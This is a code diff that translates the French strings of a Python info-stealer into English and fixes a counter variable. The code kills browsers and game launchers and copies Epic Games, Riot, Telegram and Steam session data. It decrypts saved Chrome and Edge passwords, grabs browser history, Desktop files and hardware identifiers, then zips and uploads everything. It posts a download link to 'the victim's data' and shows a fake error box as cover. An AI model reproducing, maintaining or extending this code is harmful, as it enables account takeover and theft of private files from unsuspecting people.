@@ -170,6 +170,8 @@ how_to_use_RIOT = r"""
 """
 
 async def main():
+   passwords_count_chrome = 0
+   passwords_count_edge = 0
    epicgames_pathes = [r"C:\Program Files (x86)\Epic Games\Launcher\Engine\Config", r"C:\Program Files (x86)\Epic Games\Launcher\Portal\Data"]
    riotgames_pathes = [fr"C:\Users\{user}\AppData\Local\Riot Games"]
    telegram_path = [fr"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"]
@@ -199,27 +201,27 @@ async def main():
    try:
       pc_ip = socket.gethostbyname(hostname)
    except Exception:
-      pc_ip = "None : Erreur"
+      pc_ip = "None : Error"
    try:
       pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
    except Exception:
-      pc_gpu = "None : Erreur"
+      pc_gpu = "None : Error"
    try:
       pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
    except Exception:
-      pc_cpu = "None : Erreur"
+      pc_cpu = "None : Error"
    try:
       pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
    except Exception:
-      pc_ram = "None : Erreur"
+      pc_ram = "None : Error"
    try:
       mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except Exception:
-      mac_address = "None : Erreur"
+      mac_address = "None : Error"
    try:
       pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except Exception:
-      pc_uuid = "None : Erreur"
+      pc_uuid = "None : Error"
 
 
    os.system("TASKKILL /F /IM EpicGamesLauncher.exe")
@@ -235,14 +237,11 @@ async def main():
    os.system("TASKKILL /F /IM msedge.exe")
    os.system('cls')
 
-   print("Données installées")
-   time.sleep(0.1)
-   print("Installation des modules...")
    try:
       os.makedirs(f"./{foldername}/Epic Games", exist_ok=True)
       for config_dir in epicgames_pathes:
          if os.path.exists(config_dir):
-               epic_games = "Epic Games : `Session trouvée`"
+               epic_games = "Epic Games : `Session found`"
                stolen_config_file_path = f"./{foldername}/Epic Games/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                   shutil.rmtree(stolen_config_file_path)
@@ -251,16 +250,16 @@ async def main():
                with open(f"./{foldername}/Epic Games/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                   readme_file.write(how_to_use_EG)
          else:
-               epic_games = "Epic Games : `Aucune session trouvée`"
+               epic_games = "Epic Games : `No session found`"
 
    except Exception:
-      epic_games = "` Erreur lors de la récupération `"
+      epic_games = "` An error occured `"
 
    try:
       os.makedirs(f"./{foldername}/Riot Games", exist_ok=True)
       for config_dir in riotgames_pathes:
          if os.path.exists(config_dir):
-               riot_games = "Riot Games : `Session trouvée`"
+               riot_games = "Riot Games : `Session found`"
                stolen_config_file_path = f"./{foldername}/Riot Games/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                   shutil.rmtree(stolen_config_file_path)
@@ -269,15 +268,15 @@ async def main():
                with open(f"./{foldername}/Riot Games/README - How to use.txt", "w", encoding='utf-8') as readme_file:
                   readme_file.write(how_to_use_RIOT)
          else:
-               riot_games = "Riot Games : `Aucune session trouvée`"
+               riot_games = "Riot Games : `No session found`"
    except Exception:
-      riot_games = "` Erreur lors de la récupération `"
+      riot_games = "` An error occured `"
 
    try:
       os.makedirs(f"./{foldername}/Telegram", exist_ok=True)
       for config_dir in telegram_path:
          if os.path.exists(config_dir):
-               telegram = "Telegram : `Session trouvée`"
+               telegram = "Telegram : `Session found`"
                stolen_config_file_path = f"./{foldername}/Telegram/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                   shutil.rmtree(stolen_config_file_path)
@@ -286,15 +285,15 @@ async def main():
                with open(f"./{foldername}/Telegram/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                   readme_file.write(how_to_use_TELEGRAM)
          else:
-               telegram = "Telegram : `Aucune session trouvée`"
+               telegram = "Telegram : `No session found`"
    except Exception:
-      telegram = "` Erreur lors de la récupération `"
+      telegram = "` An error occured `"
 
    try:
       os.makedirs(f"./{foldername}/Steam", exist_ok=True)
       for config_dir in steam_pathes:
          if os.path.exists(config_dir):
-               steam = "Steam : `Session trouvée`"
+               steam = "Steam : `Session found`"
                stolen_config_file_path = f"./{foldername}/Steam/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                   shutil.rmtree(stolen_config_file_path)
@@ -303,17 +302,17 @@ async def main():
                with open(f"./{foldername}/Steam/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                   readme_file.write(how_to_use_STEAM)
          else:
-               steam = "Steam : `Aucune session trouvée`"
+               steam = "Steam : `No session found`"
    except Exception:
-      steam = "` Erreur lors de la récupération `"
+      steam = "` An error occured `"
 
    os.makedirs(f"./{foldername}/Browser", exist_ok=True)
-   os.makedirs(f"./{foldername}/Browser/Historiques", exist_ok=True)
+   os.makedirs(f"./{foldername}/Browser/History", exist_ok=True)
    os.makedirs(f"./{foldername}/Browser/Passwords", exist_ok=True)
-   os.makedirs(f"./{foldername}/Système")
+   os.makedirs(f"./{foldername}/System")
 
    try:
-      with open(f"./{foldername}/Système/Hardware.txt", "w", encoding='utf-8') as hardware:
+      with open(f"./{foldername}/System/Hardware.txt", "w", encoding='utf-8') as hardware:
          hardware.write(f"""
 
    <=======================[HARDWARE & LOCAL]=======================>
@@ -339,10 +338,10 @@ async def main():
    except Exception:
       pass
    try:
-      with open(f"./{foldername}/Système/Serial check.txt", "w", encoding='utf-8') as serial_check:
+      with open(f"./{foldername}/System/Serial check.txt", "w", encoding='utf-8') as serial_check:
          serial_check.write(f"""
 
-   <=======================[NUMEROS DE SERIE]=======================>
+   <=======================[SERIAL NUMBERS]=======================>
 
    Disque Dur : {disk_serial}
    BIOS : {bios_serial}
@@ -365,7 +364,7 @@ async def main():
 
          rows = cursor.fetchall()
 
-         with open(f"./{foldername}/Browser/Historiques/Chrome.txt", "w", encoding='utf-8') as history:
+         with open(f"./{foldername}/Browser/History/Chrome.txt", "w", encoding='utf-8') as history:
             history.write("""
                                             ___________________
       <====================================[HISTORIQUE : CHROME]====================================>  
@@ -392,7 +391,7 @@ async def main():
 
             rows = cursor.fetchall()
 
-            with open(f"./{foldername}/Browser/Historiques/Edge.txt", "w", encoding='utf-8') as history:
+            with open(f"./{foldername}/Browser/History/Edge.txt", "w", encoding='utf-8') as history:
                history.write("""
                                                _________________
          <====================================[HISTORIQUE : EDGE]====================================>  
@@ -430,8 +429,8 @@ async def main():
             cursor.execute(query)
 
             with open(f"./{foldername}/Browser/Passwords/Edge.txt", "w", encoding='utf-8') as pass_file:
-               passwords_count_edge = 0
                pass_file.write("""
+                                              ________________
          <===================================[PASSWORDS : Edge]===================================>
          """)
                for row in cursor.fetchall():
@@ -450,7 +449,7 @@ async def main():
          USERNAME/MAIL : {username}
          PASSWORD : {decrypted_pass}""")
          except Exception:
-            passwords_count_edge = "Une erreur est survenue lors de la récupération"
+            passwords_count_edge = "An error occured"
             pass
 
    local_state_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State"
@@ -476,12 +475,12 @@ async def main():
          cursor.execute(query)
 
          with open(f"./{foldername}/Browser/Passwords/Chrome.txt", "w", encoding='utf-8') as pass_file:
-            paswwords_count_chrome = 0
+
             pass_file.write("""
       <===================================[PASSWORDS : Chrome]===================================>
       """)
             for row in cursor.fetchall():
-               paswwords_count_chrome += 1
+               passwords_count_chrome += 1
                origin_url = row[0]
                username = row[1]
                encrypted_password = row[2] 
@@ -496,14 +495,15 @@ async def main():
       USERNAME/MAIL : {username}
       PASSWORD : {decrypted_pass}""")
       except Exception:
-         paswwords_count_chrome = "` Une erreur est survenue lors de la récupération `"
+         passwords_count_chrome = "` An error occured `"
 
-   os.makedirs(f"./{foldername}/Fichiers volés", exist_ok=True)
+   os.makedirs(f"./{foldername}/Stolen files", exist_ok=True)
 
-   desktop_path = fr"C:\Users\{user}\OneDrive\Documents\Bureau"
+   desktop_path = fr"C:\Users\{user}\OneDrive\Documents\Desktop"
+
    if not os.path.exists(desktop_path):
       desktop_path = Path.home() / 'Desktop'
-   destination_folder = os.path.join(f"./{foldername}/Fichiers volés")
+   destination_folder = os.path.join(f"./{foldername}/Stolen files")
    stolen_files_dir_size = 0
    stolen_files = 0
    try:
@@ -527,14 +527,7 @@ async def main():
                      continue
 
    except Exception:
-      stolen_files = " ` Erreur lors de la récupération `"
-
-   os.makedirs(f"./{foldername}/Discord")
-
-   leveldb_pathes = [
-      fr"C:\Users\{user}\AppData\Roaming\discord\Local Storage\leveldb",
-      fr""
-   ]
+      stolen_files = " ` An error occured `"
 
    shutil.make_archive(foldername, "zip", foldername)
 
@@ -545,38 +538,40 @@ async def main():
    data = response.json()
    
    MESSAGE = f"""
-***INFOS LOGGED !***
+***LOGGED INFORMATION !***
 
-🔐 Mots de passes trouvés (Chrome) : `{paswwords_count_chrome}`
-🔐 Mots de passes trouvés (Edge) : `{passwords_count_edge}`
-📁 Fichiers volés : ` {stolen_files} `
+🔐 Passwords found (Chrome): `{passwords_count_chrome}`
+🔐 Passwords found (Edge): `{passwords_count_edge}`
+📁 Stolen files: `{stolen_files}`
 
-⚙️ *Infos système*
+⚙️ *System Info*
 
-Nom du PC : `{user}`  
-Adresse IP : `{pc_ip}`  
-Adresse MAC : `{mac_address}`  
-UUID : `{pc_uuid}`  
-Processeur (CPU) : `{pc_cpu}`  
-Carte graphique (GPU) : `{pc_gpu}`  
-Mémoire RAM : `{pc_ram} Go`
+PC Name: `{user}`  
+IP Address: `{pc_ip}`  
+MAC Address: `{mac_address}`  
+UUID: `{pc_uuid}`  
+Processor (CPU): `{pc_cpu}`  
+Graphics Card (GPU): `{pc_gpu}`  
+RAM Memory: `{pc_ram} GB`
 
-📁 *Sessions trouvées* :
+📁 *Sessions Found*:
 
 {epic_games}  
 {telegram}  
 {riot_games}  
 {steam}  
 
-📝 *Informations sur le fichier Stealer* :
+📝 *Stealer File Information*:
 
-Adresse du fichier : `{file_location}`  
-Statut : {Added_to_startup}
+File Path: `{file_location}`  
+Status: {Added_to_startup}
 
-📦 *Lien de téléchargement des données volées :* 
-[*Clique ici*]({data.get('link', 'Lien indisponible')}) pour télécharger les données de la victime.
+📦 *Download Link for Stolen Data:* 
+[*Click here*]({data.get('link', 'Unavailable link')}) to download the victim's data.
 
-**Attention :** Le fichier n'est disponible que 2 semaines, passé ce délai il sera supprimé automatiquement !"""
+**Note:** The file is available for 2 weeks. After this period, it will be automatically deleted!
+"""
+
 
    screenshot_path = fr"./{foldername}/screenshot.png"
 
@@ -588,7 +583,7 @@ Statut : {Added_to_startup}
    os.remove(f"{foldername}.zip")
 
    try:
-      os.system(f'''start /min powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Une erreur est survenue', 'Une erreur non gérée est survenue lors de l'installation des modules', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"''')
+      os.system(f'''powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('An unknown error occured', 'Error', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"''')
    except Exception:
       pass
 
